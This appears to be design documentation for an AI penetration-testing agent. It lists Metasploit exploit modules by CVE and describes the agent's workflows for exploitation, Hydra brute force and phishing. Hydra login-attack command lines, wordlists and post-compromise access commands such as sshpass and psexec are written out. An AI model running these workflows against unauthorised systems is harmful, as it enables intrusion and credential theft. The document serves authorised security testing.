# RedAmon Attack Paths Architecture

Comprehensive documentation of all Metasploit attack path categories and the proposed Agent Routing system for intelligent attack chain orchestration.

> **Context**: The RedAmon agent supports CVE-based exploitation, Hydra brute force credential guess chains, **phishing / social engineering** (payload generation, malicious documents, web delivery, email delivery), and **unclassified attack paths** (dynamic fallback for techniques that don't match the three primary categories), with no-module fallback workflows using nuclei, curl, code execution, and Kali shell tools. This document defines all possible attack path categories to enable evolution toward a multi-path routing system.

---

## Table of Contents

1. [Current Implementation Analysis](#current-implementation-analysis)
2. [Metasploit Module Taxonomy](#metasploit-module-taxonomy)
3. [Attack Path Categories](#attack-path-categories)
   - [Category 1: CVE-Based Exploitation](#category-1-cve-based-exploitation-current)
   - [Category 2: Brute Force / Credential Attacks](#category-2-brute-force--credential-attacks)
   - [Unclassified Fallback](#unclassified-fallback-current)
   - [Category 3: Social Engineering / Phishing](#category-3-social-engineering--phishing)
   - [Category 4: Denial of Service (DoS)](#category-4-denial-of-service-dos)
   - [Category 5: Fuzzing / Vulnerability Discovery](#category-5-fuzzing--vulnerability-discovery)
   - [Category 6: Credential Capture / MITM](#category-6-credential-capture--mitm)
   - [Category 7: Wireless / Network Attacks](#category-7-wireless--network-attacks)
   - [Category 8: Web Application Attacks](#category-8-web-application-attacks)
   - [Category 9: Client-Side Exploitation](#category-9-client-side-exploitation)
   - [Category 10: Local Privilege Escalation](#category-10-local-privilege-escalation)
4. [Agent Routing Architecture](#agent-routing-architecture)
5. [Post-Exploitation Considerations](#post-exploitation-considerations)
6. [Implementation Roadmap](#implementation-roadmap)

---

## Current Implementation Analysis

### Implemented Attack Chains

The orchestrator (`orchestrator.py`) implements four classified attack path categories:

1. **CVE-Based Exploitation** (`cve_exploit`) — Metasploit-based CVE exploitation with payload selection
2. **Brute Force / Credential Guess** (`brute_force_credential_guess`) — THC Hydra brute force against 50+ protocols
3. **Phishing / Social Engineering** (`phishing_social_engineering`) — Payload generation (msfvenom), malicious document creation (Office macros, PDF, RTF, LNK), web delivery, HTA delivery, and email sending via smtplib
4. **Unclassified Fallback** (`<term>-unclassified`) — Dynamic classification for techniques that don't match the above (e.g., `sql_injection-unclassified`, `ssrf-unclassified`). Uses generic tool guidance without workflow-specific prompts.

Additionally, the CVE path includes a **No-Module Fallback** workflow for CVEs without Metasploit modules.

#### Available Tools (across all phases)

| Tool | Server | Phase | Description |
|------|--------|-------|-------------|
| `query_graph` | Agent (Neo4j) | All | Neo4j graph database queries |
| `web_search` | Agent (Tavily) | All | Web search for CVE/exploit research |
| `execute_curl` | Network Recon :8000 | All | HTTP requests & vulnerability probing |
| `execute_naabu` | Network Recon :8000 | All | Fast port scanning |
| `execute_nmap` | Nmap :8004 | All | Deep scanning, NSE scripts |
| `execute_nuclei` | Nuclei :8002 | All | CVE verification via YAML templates |
| `kali_shell` | Network Recon :8000 | All | General Kali shell (netcat, socat, searchsploit, msfvenom, sqlmap, john, etc.) |
| `execute_code` | Network Recon :8000 | Expl + Post | Code execution without shell escaping (Python, bash, C, etc.) |
| `metasploit_console` | Metasploit :8003 | Expl + Post | Metasploit Framework commands |

### Existing CVE-Based Attack Chain

```
┌─────────────────────────────────────────────────────────────────┐
│                    CURRENT: CVE-BASED CHAIN                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. search CVE-XXXX-XXXXX     → Find exploit module path        │
│  2. use exploit/path/...      → Load module                      │
│  3. info                      → Get module description           │
│  4. show targets              → List OS/app versions             │
│  5. show options              → Display configurable params      │
│  6. set TARGET <N>            → Select target type               │
│  7. show payloads             → List compatible payloads         │
│  8. set CVE CVE-XXXX-XXXXX    → Set CVE variant (if applicable) │
│  9. set PAYLOAD <payload>     → Choose payload                   │
│  10. set RHOSTS/RPORT/SSL     → Configure connection             │
│  11. set LHOST/LPORT (or CMD) → Mode-specific options            │
│  12. exploit                  → Execute                          │
│                                                                  │
│  Post-Exploitation: Meterpreter (statefull) or re-run (stateless)│
└─────────────────────────────────────────────────────────────────┘
```

### Remaining Limitations

1. **Three Attack Paths**: CVE exploit, Hydra brute force, and phishing/social engineering are fully implemented
2. **No DoS/Fuzzing Chains**: DoS and fuzzing workflows not yet implemented as classified paths
3. **No Credential Capture**: MITM/capture chains not yet implemented
4. **No Client-Side Exploitation**: Browser-based exploitation not yet a classified path

---

## Metasploit Module Taxonomy

Understanding the full module taxonomy is essential for routing decisions.

### Module Types (7 Categories)

| Type | Count | Purpose | Post-Expl Phase? |
|------|-------|---------|------------------|
| **exploit** | ~2,300+ | Actively exploit vulnerabilities | Yes |
| **auxiliary** | ~1,120+ | Scanning, brute force, fuzzing, DoS, capture | Sometimes |
| **post** | ~350+ | Post-exploitation actions | N/A (IS post) |
| **payload** | ~600+ | Code executed after exploitation | N/A |
| **encoder** | ~50+ | Payload encoding (bad chars, NOT AV evasion) | N/A |
| **evasion** | ~10+ | AV/EDR bypass payload generation | N/A |
| **nop** | ~10+ | NOP sled generation for buffer overflows | N/A |

### Auxiliary Module Subcategories

```
auxiliary/
├── admin/          # Administrative tasks on compromised systems
├── analyze/        # Password hash analysis, time-based operations
├── client/         # Client-side tools (SMTP, browser)
├── crawler/        # Web crawlers and spiders
├── docx/           # Document-based attacks
├── dos/            # Denial of Service modules
├── fileformat/     # Malicious file generation
├── fuzzers/        # Protocol and input fuzzers
├── gather/         # Information gathering
├── parser/         # Log and data parsers
├── pdf/            # PDF-based attacks
├── scanner/        # Network and service scanners
│   ├── discovery/  # Host discovery
│   ├── ftp/        # FTP enumeration/brute force
│   ├── http/       # HTTP scanning
│   ├── mssql/      # MSSQL enumeration
│   ├── mysql/      # MySQL enumeration
│   ├── pop3/       # POP3 enumeration
│   ├── postgres/   # PostgreSQL enumeration
│   ├── rdp/        # RDP scanning
│   ├── smb/        # SMB enumeration/brute force
│   ├── smtp/       # SMTP enumeration
│   ├── snmp/       # SNMP scanning
│   ├── ssh/        # SSH brute force
│   ├── telnet/     # Telnet brute force
│   ├── vnc/        # VNC scanning
│   └── ...         # Many more protocols
├── server/         # Fake servers for credential capture
│   └── capture/    # Credential harvesting (SMB, HTTP, FTP)
├── spoof/          # Spoofing modules (ARP, NBNS, etc.)
├── sqli/           # SQL injection tools
├── voip/           # VoIP-related modules
└── ...
```

---

## Attack Path Categories

### Category Overview

| # | Category | Entry Point | Module Type | Post-Expl? | Complexity |
|---|----------|-------------|-------------|------------|------------|
| 1 | CVE-Based Exploitation | `search CVE-*` | exploit | Yes | High |
| 2 | Brute Force / Credential | `use auxiliary/scanner/*/login` | auxiliary | Sometimes | Medium |
| 3 | Social Engineering **(IMPLEMENTED)** | `msfvenom`, `fileformat/*`, `web_delivery` | auxiliary/exploit | Yes | High |
| 4 | DoS / Availability | `use auxiliary/dos/*` | auxiliary | No | Low |
| 5 | Fuzzing / Discovery | `use auxiliary/fuzzers/*` | auxiliary | No | Low |
| 6 | Credential Capture | `use auxiliary/server/capture/*` | auxiliary | Sometimes | Medium |
| 7 | Wireless Attacks | `use auxiliary/spoof/*` | auxiliary | Sometimes | Medium |
| 8 | Web Application | `use auxiliary/scanner/http/*` | auxiliary/exploit | Sometimes | Medium |
| 9 | Client-Side Exploitation | `use exploit/*/browser/*` | exploit | Yes | High |
| 10 | Local Privilege Escalation | `use exploit/*/local/*` | exploit/post | N/A | Medium |

---

## Category 1: CVE-Based Exploitation (Current)

**Description**: Exploit known vulnerabilities identified by CVE identifier or MS bulletin.

**Entry Detection Keywords**: `CVE-`, `MS17-`, `exploit`, `vulnerability`, `pwn`, `hack`, `rce`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              CVE-BASED EXPLOIT CHAIN                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. search CVE-XXXX-XXXXX     → Find exploit module path        │
│  2. use exploit/path/...      → Load module                      │
│  3. info                      → Get module description           │
│  4. show targets              → List OS/app versions             │
│  5. show options              → Display configurable params      │
│  6. set TARGET <N>            → Select target type               │
│  7. show payloads             → List compatible payloads         │
│  8. set PAYLOAD <payload>     → Choose payload                   │
│  9. set RHOSTS/RPORT/SSL      → Configure connection             │
│  10. set LHOST/LPORT (or CMD) → Mode-specific options            │
│  11. exploit                  → Execute                          │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

**Post-Exploitation**:
- Statefull: Meterpreter session → transition to post_exploitation phase
- Stateless: Command output captured → optionally re-run with different CMD

### 1.1 Remote Code Execution (RCE) Exploits

| # | Attack Type | Description | CVE/Module | Metasploit Module |
|---|-------------|-------------|------------|-------------------|
| 1 | **Path Traversal RCE** | Exploits path normalization flaws to execute code via CGI | CVE-2021-41773, CVE-2021-42013 | `exploit/multi/http/apache_normalize_path_rce` |
| 2 | **Deserialization RCE** | Exploits insecure deserialization in Java, PHP, .NET | CVE-2015-4852 | `exploit/multi/misc/weblogic_deserialize` |
| 3 | **Command Injection** | Injects OS commands through vulnerable parameters | Various | `exploit/unix/webapp/*_cmd_exec` |
| 4 | **Server-Side Template Injection (SSTI)** | Exploits template engines (Jinja2, Twig, Freemarker) | CVE-2019-11581 | `exploit/multi/http/jira_*` |
| 5 | **Log4Shell** | JNDI injection in Log4j leading to RCE | CVE-2021-44228 | `exploit/multi/http/log4shell_header_injection` |
| 6 | **Spring4Shell** | Spring Framework RCE via data binding | CVE-2022-22965 | `exploit/multi/http/spring_framework_rce_spring4shell` |
| 7 | **Shellshock** | Bash environment variable injection via CGI | CVE-2014-6271 | `exploit/multi/http/apache_mod_cgi_bash_env_exec` |
| 8 | **ImageMagick RCE (ImageTragick)** | Exploits image processing libraries | CVE-2016-3714 | `exploit/unix/fileformat/imagemagick_delegate` |
| 9 | **FFmpeg SSRF/RCE** | Exploits video processing to read files or execute code | CVE-2016-1897 | `exploit/unix/webapp/ffmpeg_*` |
| 10 | **PHP Object Injection** | Exploits unserialize() for code execution | Various | `exploit/multi/http/php_*` |

### 1.2 Service-Specific CVE Exploits

| # | Attack Type | Description | CVE/Module | Metasploit Module |
|---|-------------|-------------|------------|-------------------|
| 11 | **SMB EternalBlue** | Windows SMB RCE | MS17-010 | `exploit/windows/smb/ms17_010_eternalblue` |
| 12 | **SMB MS08-067** | Windows Server Service NetAPI exploit | MS08-067 | `exploit/windows/smb/ms08_067_netapi` |
| 13 | **RDP BlueKeep** | Remote Desktop Protocol pre-auth RCE | CVE-2019-0708 | `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` |
| 14 | **Redis Unauthorized Access** | Exploits unauthenticated Redis for RCE | N/A | `exploit/linux/redis/redis_replication_cmd_exec` |
| 15 | **Elasticsearch RCE** | Search engine misconfigurations | CVE-2014-3120 | `exploit/multi/elasticsearch/script_mvel_rce` |
| 16 | **vsftpd 2.3.4 Backdoor** | Exploits backdoor in FTP server | N/A | `exploit/unix/ftp/vsftpd_234_backdoor` |
| 17 | **ProFTPd mod_copy** | Arbitrary file copy leading to RCE | CVE-2015-3306 | `exploit/unix/ftp/proftpd_modcopy_exec` |
| 18 | **Samba Usermap Script** | Samba username map script command execution | CVE-2007-2447 | `exploit/multi/samba/usermap_script` |
| 19 | **OpenSSH AuthorizedKeysCommand** | SSH RCE via AuthorizedKeysCommand | CVE-2016-10009 | `exploit/linux/ssh/openssh_authkeys_backdoor` |
| 20 | **VNC Authentication Bypass** | Exploits weak/no authentication | CVE-2006-2369 | `auxiliary/scanner/vnc/vnc_none_auth` |

### 1.3 Email & Messaging CVE Exploits

| # | Attack Type | Description | CVE | Metasploit Module |
|---|-------------|-------------|-----|-------------------|
| 21 | **Exchange ProxyLogon** | Pre-auth RCE on Exchange | CVE-2021-26855 | `exploit/windows/http/exchange_proxylogon_rce` |
| 22 | **Exchange ProxyShell** | Chain of vulnerabilities for RCE | CVE-2021-34473 | `exploit/windows/http/exchange_proxyshell_rce` |
| 23 | **Exim RCE** | Multiple RCE in Exim MTA | CVE-2019-15846 | `exploit/linux/smtp/exim_*` |
| 24 | **Zimbra RCE** | Multiple RCE vulnerabilities | CVE-2022-27925 | `exploit/linux/http/zimbra_*` |
| 25 | **Roundcube Exploitation** | Webmail application vulnerabilities | CVE-2020-12640 | `exploit/linux/http/roundcube_*` |

### 1.4 Database CVE Exploits

| # | Attack Type | Description | CVE/Module | Metasploit Module |
|---|-------------|-------------|------------|-------------------|
| 26 | **MySQL UDF Injection** | User-defined function injection for code execution | N/A | `exploit/multi/mysql/mysql_udf_payload` |
| 27 | **PostgreSQL RCE** | Large object and COPY exploitation | N/A | `exploit/linux/postgres/postgres_payload` |
| 28 | **MSSQL xp_cmdshell** | Command execution via stored procedures | N/A | `exploit/windows/mssql/mssql_payload` |
| 29 | **CouchDB RCE** | Admin party and CVE exploits | CVE-2017-12635 | `exploit/linux/http/couchdb_exec` |
| 30 | **H2 Database Console RCE** | Exploits H2 web console | CVE-2021-42392 | `exploit/multi/http/h2_console_rce` |
| 31 | **Apache Solr RCE** | Velocity template injection | CVE-2019-17558 | `exploit/multi/http/solr_velocity_rce` |

### 1.5 CMS & Framework CVE Exploits

| # | Attack Type | Description | CVE | Metasploit Module |
|---|-------------|-------------|-----|-------------------|
| 32 | **WordPress Plugin RCE** | Exploits vulnerable plugins | Various | `exploit/unix/webapp/wp_*` |
| 33 | **Drupalgeddon** | Drupal RCE via AJAX form API | CVE-2018-7600 | `exploit/unix/webapp/drupal_drupalgeddon2` |
| 34 | **Joomla RCE** | Object injection exploits | CVE-2015-8562 | `exploit/multi/http/joomla_*` |
| 35 | **Magento RCE** | E-commerce platform vulnerabilities | CVE-2019-8144 | `exploit/multi/http/magento_*` |
| 36 | **Laravel Debug Mode RCE** | Exploits exposed debug mode | CVE-2021-3129 | `exploit/unix/http/laravel_ignition_rce` |
| 37 | **ThinkPHP RCE** | Multiple RCE vulnerabilities | CVE-2018-20062 | `exploit/multi/http/thinkphp_*` |
| 38 | **Ruby on Rails RCE** | Deserialization and other CVEs | CVE-2013-0156 | `exploit/multi/http/rails_*` |
| 39 | **vBulletin RCE** | Pre-auth RCE in forum software | CVE-2019-16759 | `exploit/multi/http/vbulletin_*` |
| 40 | **phpMyAdmin RCE** | Database management tool vulnerabilities | CVE-2016-5734 | `exploit/multi/http/phpmyadmin_*` |

### 1.6 Network Infrastructure CVE Exploits

| # | Attack Type | Description | CVE | Metasploit Module |
|---|-------------|-------------|-----|-------------------|
| 41 | **Cisco IOS Exploitation** | Router/switch command injection | Various | `exploit/linux/misc/cisco_*` |
| 42 | **Juniper Backdoor** | Authentication bypass | CVE-2015-7755 | `exploit/linux/ssh/juniper_backdoor` |
| 43 | **MikroTik RouterOS RCE** | Winbox and webfig exploitation | CVE-2018-14847 | `exploit/linux/misc/mikrotik_*` |
| 44 | **Fortinet FortiOS RCE** | VPN and firewall exploitation | CVE-2018-13379 | `auxiliary/scanner/http/fortinet_ssl_vpn` |
| 45 | **Palo Alto GlobalProtect** | VPN gateway vulnerabilities | CVE-2019-1579 | `exploit/linux/http/paloalto_*` |
| 46 | **SonicWall SSLVPN RCE** | VPN appliance exploitation | CVE-2021-20016 | `exploit/linux/http/sonicwall_*` |
| 47 | **Citrix ADC/Gateway RCE** | Path traversal RCE | CVE-2019-19781 | `exploit/linux/http/citrix_dir_traversal_rce` |
| 48 | **F5 BIG-IP RCE** | TMUI RCE | CVE-2020-5902 | `exploit/linux/http/f5_bigip_tmui_rce` |
| 49 | **Pulse Secure VPN RCE** | Arbitrary file read | CVE-2019-11510 | `auxiliary/scanner/http/pulse_ssl_vpn` |

### 1.7 Container & Cloud Exploits

| # | Attack Type | Description | Target | Metasploit Module |
|---|-------------|-------------|--------|-------------------|
| 50 | **Docker API RCE** | Exploits exposed Docker daemon API | Port 2375/2376 | `exploit/linux/http/docker_daemon_tcp` |
| 51 | **Kubernetes API Exploitation** | Exploits misconfigured K8s clusters | Port 6443/10250 | `auxiliary/scanner/http/kubernetes_*` |
| 52 | **Docker Container Escape** | Breaks out of container isolation | Privileged containers | `post/multi/escalate/docker_*` |
| 53 | **AWS Metadata SSRF** | Accesses EC2 instance metadata | 169.254.169.254 | `auxiliary/scanner/http/aws_*` |
| 54 | **etcd Unauthenticated Access** | Extracts secrets from K8s etcd | Port 2379 | `auxiliary/scanner/http/etcd_*` |
| 55 | **HashiCorp Consul Exploitation** | Consul RCE | Port 8500 | `exploit/multi/http/consul_*` |

---

## Category 2: Brute Force / Credential Attacks (CURRENT — THC Hydra)

**Description**: Password guessing attacks against authentication services using THC Hydra. This is a fully implemented attack path — classified as `brute_force_credential_guess` by the LLM router.

**Tool**: `execute_hydra` (NOT `metasploit_console` — Hydra replaced all Metasploit `auxiliary/scanner/*/login` modules)

**Entry Detection Keywords**: `brute`, `password`, `credential`, `login`, `crack`, `spray`, `guess`, `dictionary`, `wordlist`

**Key Differences from CVE Chain**:
- Uses **THC Hydra** (stateless CLI tool) instead of Metasploit auxiliary modules
- No interactive console — each attempt is a single `execute_hydra` call
- No sessions — Hydra reports found credentials and exits; session establishment is a separate step
- Configurable per-project via `HYDRA_*` settings in project settings

### Project Settings (Default Configuration)

| Setting | Default | Description |
|---------|---------|-------------|
| `HYDRA_ENABLED` | `true` | Enable/disable Hydra tool |
| `HYDRA_THREADS` | `16` | Default parallel connections (`-t`) |
| `HYDRA_WAIT_BETWEEN_CONNECTIONS` | `0` | Delay between attempts (seconds, `-W`) |
| `HYDRA_CONNECTION_TIMEOUT` | `32` | Timeout per connection (seconds) |
| `HYDRA_STOP_ON_FIRST_FOUND` | `true` | Stop after first success (`-f`) |
| `HYDRA_EXTRA_CHECKS` | `nsr` | Try null password, same-as-login, reversed (`-e nsr`) |
| `HYDRA_VERBOSE` | `true` | Show each attempt (`-V`) |
| `HYDRA_MAX_WORDLIST_ATTEMPTS` | `3` | Max retry attempts with different wordlists |

These are compiled into pre-configured flags injected into every `execute_hydra` call:
```
-t 16 -W 0 -f -e nsr -V
```

### Hydra Attack Chain Workflow

```
┌──────────────────────────────────────────────────────────────────────────┐
│              BRUTE FORCE ATTACK CHAIN (THC Hydra)                        │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Step 0: GATHER TARGET CONTEXT                                           │
│  ─────────────────────────────                                           │
│  - Check target_info.technologies for OS/platform hints                  │
│  - Query graph: "What technologies are detected on <target-ip>?"         │
│  - Use naabu or SSH banner to identify service/OS if unclear             │
│                                                                          │
│  Step 1: SELECT HYDRA PROTOCOL                                           │
│  ─────────────────────────────                                           │
│  - Map target service → Hydra protocol string (see protocol table)       │
│  - Apply protocol-specific thread limits (SSH: max 4, RDP: max 1)        │
│  - Add -s PORT for non-default ports, -S for SSL/TLS                     │
│                                                                          │
│  Step 2: BUILD & EXECUTE HYDRA COMMAND                                   │
│  ─────────────────────────────────────                                   │
│  - Credential flags: -l/-L (user), -p/-P (pass), or -C (combo file)     │
│  - Pre-configured flags from project settings                            │
│  - Target: protocol://IP[:PORT]                                          │
│  - Execute via execute_hydra tool (NOT metasploit_console)               │
│                                                                          │
│  Step 3: PARSE RESULTS & RETRY                                           │
│  ─────────────────────────────                                           │
│  - Success: "[port][proto] host: IP  login: USER  password: PASS"        │
│  - Failure: "0 valid passwords found" → try next wordlist strategy       │
│  - Retry up to HYDRA_MAX_WORDLIST_ATTEMPTS (default 3) times             │
│                                                                          │
│  Step 4: SESSION ESTABLISHMENT (after creds found)                       │
│  ─────────────────────────────────────────────────                       │
│  - Hydra is stateless — does NOT create sessions                         │
│  - Use kali_shell/metasploit_console to establish access manually        │
│  - Transition to post_exploitation phase                                 │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### Retry Strategy (3 Attempts)

```
┌──────────────────────────────────────────────────────────────────────────┐
│              RETRY POLICY (per attack)                                    │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Attempt 1: OS-aware single username + common passwords                  │
│  ─────────                                                               │
│    Ubuntu:  -l ubuntu -P unix_passwords.txt                              │
│    AWS:     -l ec2-user -P unix_passwords.txt                            │
│    Generic: -l root -P common_roots.txt                                  │
│    Windows: -l Administrator -P unix_passwords.txt                       │
│                                                                          │
│  Attempt 2: Comprehensive user list + password list                      │
│  ─────────                                                               │
│    -L unix_users.txt -P unix_passwords.txt                               │
│                                                                          │
│  Attempt 3: Service-specific combo file                                  │
│  ─────────                                                               │
│    SSH:     -C piata_ssh_userpass.txt                                    │
│    Tomcat:  -C tomcat_mgr_default_userpass.txt                           │
│    Postgres:-C postgres_default_userpass.txt                              │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### Protocol Table

#### 2.1 Network Service Brute Force

| # | Attack Type | Service | Port | Hydra Protocol | Max `-t` | Notes |
|---|-------------|---------|------|----------------|----------|-------|
| 1 | **SSH Brute Force** | SSH | 22 | `ssh` | 4 | Connection rate limiting |
| 2 | **FTP Brute Force** | FTP | 21 | `ftp` | default | |
| 3 | **Telnet Brute Force** | Telnet | 23 | `telnet` | default | |
| 4 | **SMB Brute Force** | SMB | 445 | `smb` | default | Supports `DOMAIN\user` |
| 5 | **RDP Brute Force** | RDP | 3389 | `rdp` | 1 | Very slow, service crashes under load |
| 6 | **VNC Brute Force** | VNC | 5900 | `vnc` | 4 | **Password-only**: `-p "" -P <file>` |
| 7 | **SNMP Community Brute** | SNMP | 161 | `snmp` | default | Community string guessing |

#### 2.2 Database Brute Force

| # | Attack Type | Service | Port | Hydra Protocol | Notes |
|---|-------------|---------|------|----------------|-------|
| 8 | **MySQL Brute Force** | MySQL | 3306 | `mysql` | |
| 9 | **MSSQL Brute Force** | MSSQL | 1433 | `mssql` | |
| 10 | **PostgreSQL Brute Force** | PostgreSQL | 5432 | `postgres` | |
| 11 | **Oracle Brute Force** | Oracle | 1521 | `oracle-listener` | |
| 12 | **MongoDB Brute Force** | MongoDB | 27017 | `mongodb` | |
| 13 | **Redis Auth Brute** | Redis | 6379 | `redis` | **Password-only**: `-p "" -P <file>` |

#### 2.3 Email Service Brute Force

| # | Attack Type | Service | Port | Hydra Protocol | Notes |
|---|-------------|---------|------|----------------|-------|
| 14 | **POP3 Brute Force** | POP3 | 110 | `pop3` | Use `-S` for POP3S (port 995) |
| 15 | **IMAP Brute Force** | IMAP | 143 | `imap` | Use `-S` for IMAPS (port 993) |
| 16 | **SMTP Brute Force** | SMTP | 25/587 | `smtp` | Use `-S` for SMTPS |

#### 2.4 Web Application Brute Force

| # | Attack Type | Service | Port | Hydra Protocol | Notes |
|---|-------------|---------|------|----------------|-------|
| 17 | **HTTP Basic Auth** | HTTP | 80/443 | `http-get` | Append path: `http-get://target/admin` |
| 18 | **HTTP POST Form** | HTTP | 80/443 | `http-post-form` | Special syntax (see below) |
| 19 | **Tomcat Manager** | Tomcat | 8080 | `http-get` | Path: `/manager/html` |
| 20 | **WordPress Login** | WordPress | 80/443 | `http-post-form` | Analyze login form first |
| 21 | **Jenkins Login** | Jenkins | 8080 | `http-post-form` | Path: `/j_acegi_security_check` |

### HTTP POST Form Special Syntax

For `http-post-form`, the target IP comes **before** the protocol, and the form spec uses colon `:` separators:

```
hydra -l admin -P passwords.txt <flags> <ip> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
```

**Form specification**: `"/path:POST_BODY:CONDITION"`
- `^USER^` — username placeholder (replaced by Hydra)
- `^PASS^` — password placeholder (replaced by Hydra)
- `F=string` — **Failure** condition: response containing this string = login failed
- `S=string` — **Success** condition: response containing this string = login succeeded
- `H=Header: value` — Custom HTTP header
- `C=/path` — Visit URL first for cookie gathering

**Examples**:
```bash
# WordPress
-l admin -P passwords.txt <ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"

# Jenkins
-l admin -P passwords.txt <ip> http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid"

# Tomcat Manager (http-get with combo file)
-C tomcat_mgr_default_userpass.txt http-get://<ip>:8080/manager/html
```

### Hydra Output Patterns

| Output Pattern | Meaning |
|---------------|---------|
| `[22][ssh] host: 10.0.0.5   login: root   password: toor` | **SUCCESS** — credentials found |
| `1 of 1 target successfully completed, 1 valid password found` | Confirmation of success |
| `0 valid passwords found` | **FAILED** — try next wordlist strategy |
| `[ERROR] target ssh://... does not support password authentication` | Wrong auth method (e.g., key-only SSH) |
| `[ERROR] could not connect to ssh://...` | Target unreachable or port closed |
| `[WARNING] ... restoring connection` | Thread count too high — reduce `-t` |

### Available Wordlists

**Location**: `/usr/share/metasploit-framework/data/wordlists/`

**General Purpose**:
| File | Hydra Flag | Description |
|------|-----------|-------------|
| `unix_users.txt` | `-L` | Common Unix usernames (~170 entries) |
| `unix_passwords.txt` | `-P` | Common Unix passwords (~1000 entries) |
| `password.lst` | `-P` | General password list (~2000 entries) |
| `burnett_top_1024.txt` | `-P` | Top 1024 most common passwords |
| `burnett_top_500.txt` | `-P` | Top 500 most common passwords |
| `common_roots.txt` | `-P` | Common root passwords |
| `keyboard-patterns.txt` | `-P` | Keyboard patterns (qwerty, 123456, etc.) |

**Service-Specific**:
| File | Hydra Flag | Service |
|------|-----------|---------|
| `piata_ssh_userpass.txt` | `-C` | SSH user:pass combos |
| `root_userpass.txt` | `-C` | Root credentials |
| `tomcat_mgr_default_userpass.txt` | `-C` | Tomcat Manager combos |
| `tomcat_mgr_default_pass.txt` | `-P` | Tomcat Manager passwords |
| `postgres_default_userpass.txt` | `-C` | PostgreSQL combos |
| `oracle_default_userpass.txt` | `-C` | Oracle DB combos |
| `db2_default_userpass.txt` | `-C` | IBM DB2 combos |
| `http_default_userpass.txt` | `-C` | HTTP Basic Auth combos |
| `http_owa_common.txt` | `-P` | Outlook Web Access passwords |
| `vnc_passwords.txt` | `-P` | VNC passwords (password-only service) |
| `snmp_default_pass.txt` | `-P` | SNMP community strings |

### Post-Credential Session Establishment

Hydra is stateless — after finding credentials, access must be established manually:

| Service | Tool | Command |
|---------|------|---------|
| SSH | `kali_shell` | `sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no <user>@<ip> 'whoami && id && uname -a'` |
| SMB | `metasploit_console` | `use exploit/windows/smb/psexec; set SMBUser <user>; set SMBPass <pass>; set RHOSTS <ip>; run` |
| MySQL | `kali_shell` | `mysql -h <ip> -u <user> -p'<pass>' -e 'SELECT user(); SHOW DATABASES;'` |
| PostgreSQL | `kali_shell` | `PGPASSWORD='<pass>' psql -h <ip> -U <user> -c 'SELECT current_user;'` |
| FTP | `kali_shell` | `curl -u <user>:<pass> ftp://<ip>/` |
| Redis | `kali_shell` | `redis-cli -h <ip> -a '<pass>' INFO` |
| MongoDB | `kali_shell` | `mongosh --host <ip> -u <user> -p '<pass>' --eval 'db.adminCommand("listDatabases")'` |
| VNC | `kali_shell` | `echo '<pass>' \| timeout 5 vncviewer <ip> -passwd /dev/stdin` |
| Tomcat | `metasploit_console` | `use exploit/multi/http/tomcat_mgr_upload; set HttpUsername <user>; set HttpPassword <pass>; set RHOSTS <ip>; run` |
| HTTP | `execute_curl` | Login with discovered credentials |

### Implementation Files

| File | Purpose |
|------|---------|
| `agentic/prompts/brute_force_credential_guess_prompts.py` | Full Hydra workflow prompts, retry logic, templates |
| `agentic/prompts/tool_registry.py` | `execute_hydra` tool definition (50+ protocols) |
| `agentic/project_settings.py` | `HYDRA_*` settings, `get_hydra_flags_from_settings()` |
| `mcp/servers/network_recon_server.py` | `execute_hydra` MCP tool (subprocess, progress tracking on port 8014) |
| `agentic/state.py` | `AttackPathClassification` model (`brute_force_credential_guess`) |
| `agentic/prompts/classification.py` | LLM classification keywords for brute force routing |
| `agentic/prompts/stealth_rules.py` | Hydra **forbidden** in stealth mode |

---

## Unclassified Fallback (CURRENT)

**Status**: IMPLEMENTED
**Classification**: `<descriptive_term>-unclassified` (e.g., `sql_injection-unclassified`, `ssrf-unclassified`)
**Prompts**: Generic exploitation guidance (`prompts/unclassified_prompts.py`)

### Overview

When a user request doesn't match CVE exploitation or brute force credential guessing, the LLM classifier creates a dynamic attack path type by generating a short, descriptive snake_case term followed by `-unclassified`. This fallback ensures the agent can handle arbitrary exploitation requests without being forced into an inappropriate workflow.

### How It Works

1. **Classification**: The LLM analyzes the user's request and determines it doesn't fit `cve_exploit` or `brute_force_credential_guess`
2. **Naming**: The LLM creates a descriptive term (e.g., `sql_injection`, `xss`, `ssrf`, `file_upload`, `command_injection`)
3. **Suffix**: The term is appended with `-unclassified` to clearly mark it as a path without specialized workflow prompts
4. **Validation**: The Pydantic validator enforces the pattern `^[a-z][a-z0-9_]*-unclassified$`

### Example Classifications

| User Request | Classification |
|-------------|---------------|
| "Try SQL injection on the web app" | `sql_injection-unclassified` |
| "Test for SSRF on the API" | `ssrf-unclassified` |
| "Try to upload a web shell" | `file_upload-unclassified` |
| "Test for XSS on the login page" | `xss-unclassified` |
| "Attempt directory traversal" | `directory_traversal-unclassified` |
| "Try command injection" | `command_injection-unclassified` |

### Agent Behavior

- **No mandatory workflow**: The agent uses available tools generically based on the technique
- **All exploitation tools available**: metasploit_console, execute_hydra, execute_code, execute_curl, execute_nuclei, kali_shell
- **Frontend badge**: Displays a grey badge with the technique abbreviation (e.g., "SI" for SQL Injection)
- **Graph storage**: The `attack_path_type` is stored as-is in the `AttackChain` Neo4j node

### Relevant Files

| File | Purpose |
|------|---------|
| `prompts/classification.py` | Classification prompt with unclassified option |
| `prompts/unclassified_prompts.py` | Generic exploitation guidance (no specific workflow) |
| `prompts/__init__.py` | Routing logic: `attack_path_type.endswith("-unclassified")` |
| `state.py` | Pydantic validator for the `*-unclassified` pattern |

---

## Category 3: Social Engineering / Phishing (CURRENT — `phishing_social_engineering`)

**Status**: IMPLEMENTED
**Classification**: `phishing_social_engineering`
**Prompts**: `prompts/phishing_social_engineering_prompts.py`

